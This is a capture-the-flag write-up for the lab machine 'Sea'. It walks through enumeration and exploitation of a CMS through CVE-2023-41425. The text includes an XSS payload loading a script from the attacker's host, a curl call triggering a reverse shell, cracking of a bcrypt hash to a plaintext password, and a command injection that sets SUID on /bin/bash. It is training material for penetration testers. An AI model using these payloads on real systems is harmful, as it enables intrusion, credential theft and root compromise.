---
title: Sea
tags:
  - Linux
  - CVE
  - Brute-Forcing
  - Tunnelling
  - Command-Injection
---
![](Pasted%20image%2020240901173921.png)

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.28 sea.htb" | sudo tee -a /etc/hosts
```

Then, I performed an Nmap scan:

```shell
nmap -sC -T4 -p- sea.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

So I took a look at the webpage:

![](Pasted%20image%2020240901174311.png)

After some inspection, I decided to perform a subdomain scan using [Ffuf 🐳](/notes/tools/Ffuf.md) and a [dirsearch 📁](/notes/tools/dirsearch.md) scan, but I didn't found anything, so I took a look back to the webpage and discover the `contact.php` endpoint:

![](Pasted%20image%2020240901175856.png)

After some tries of XSS and SQLi, I got anything, so i went back to further enumeration again with dirsearch:

```shell
[redacted]
dirsearch -u http://sea.htb/themes/bike -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[redacted]
[18:03:05] 301 -  239B  - /themes/bike/img  ->  http://sea.htb/themes/bike/img/
[18:03:05] 200 -    1KB - /themes/bike/home                                 
[18:03:06] 200 -    6B  - /themes/bike/version                              
[18:03:06] 404 -    3KB - /themes/bike/Home                                 
[18:03:07] 301 -  239B  - /themes/bike/css  ->  http://sea.htb/themes/bike/css/
[18:03:09] 200 -   66B  - /themes/bike/summary                              
[18:03:11] 200 -    1KB - /themes/bike/404                                  
[18:03:17] 200 -    1KB - /themes/bike/LICENSE                              
[18:03:51] 404 -    3KB - /themes/bike/HOME                                 
[18:04:27] 404 -    3KB - /themes/bike/_home                                
[18:04:37] 404 -  269B  - /themes/bike/http%3A%2F%2Fwww
```

I inspected the LICENSE and version (3.2.0):

![](Pasted%20image%2020240901180835.png)

So I decided to take a look at `turboblack` on the Internet:
- [HamsterCMS](https://github.com/turboblack/HamsterCMS)

## Weaponization

Then I searched for *"hamster cms 3.2.0 exploit"* and got [CVE-2023-41425](https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE)

## Exploitation

Execute the script like:

```shell
python3 exploit.py http://sea.htb/loginURL 10.10.14.60 9001
```

Now set up a netcat listener at port 9001 and paste the following in the url of the form:

```sh
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.60:8000/xss.js"></script><form+action="
```

![](Pasted%20image%2020240901213141.png)

Now perform the following curl request:

```shell
curl "http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.60&lport=9001"
```

> We've got a reverse shell :D

![](Pasted%20image%2020240901213259.png)

Stabilize the shell:

```shell
python3 -c "import pty; pty.spawn('/bin/bash')"
# then
export TERM=xterm
# Press -> Ctrl + Z
stty raw -echo; fg
```

Unfortunately, we can't read user flag, so I decided to further inspect the machine. Inside the `/var/www/sea/data` I found a file called `database.js`, which contained a password hash:

```shell
www-data@sea:/var/www/sea/data$ cat database.js 
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/09\/01 19:38:45": "127.0.0.1",
            "2024\/09\/01 19:36:45": "127.0.0.1",
            "2024\/09\/01 19:29:44": "127.0.0.1",
            "2024\/09\/01 19:29:14": "127.0.0.1",
            "2024\/09\/01 19:27:44": "127.0.0.1"
        },
        "lastModulesSync": "2024\/09\/01",
        "customModules": {
            "themes": {},
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
[redacted]
```

Inspecting [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes), `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q` seems to be bcrypt. So I tried to crack that hash:

```shell
hashcat -m 3200 '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q' /usr/share/wordlists/rockyou.txt
```

After a long time arguing why it didn't work, I noticed that the `/` were escaped, so just set the command like:

```shell
hashcat -m 3200 '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' /usr/share/wordlists/rockyou.txt
```

Bingo! `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
`
> I got user flag :D

![](Pasted%20image%2020240901215438.png)

## Privilege escalation

Now it's time to run linpeas and see possible PE. I noticed that port 8080 was in use, so I decided to make a port forwarding to my machine:

![](Pasted%20image%2020240901215737.png)

In my machine I ran:

```shell
ssh -L 1010:127.0.0.1:8080 -N amay@sea.htb
```

Now I visited  the new port available:

![](Pasted%20image%2020240901220115.png)

And I used the machine credentials: `amay:mychemicalromance`:

![](Pasted%20image%2020240901220157.png)

Let's try to analyze the request of the **Analyze** button:

![](Pasted%20image%2020240901220631.png)

If we send the petition to the repeater, we can try to perform a command injection:

Command: `chmod u+s /bin/bash`

![](Pasted%20image%2020240901220855.png)

> We can now become root and obtain root flag

![](Pasted%20image%2020240901221038.png)

==Machine pwned==

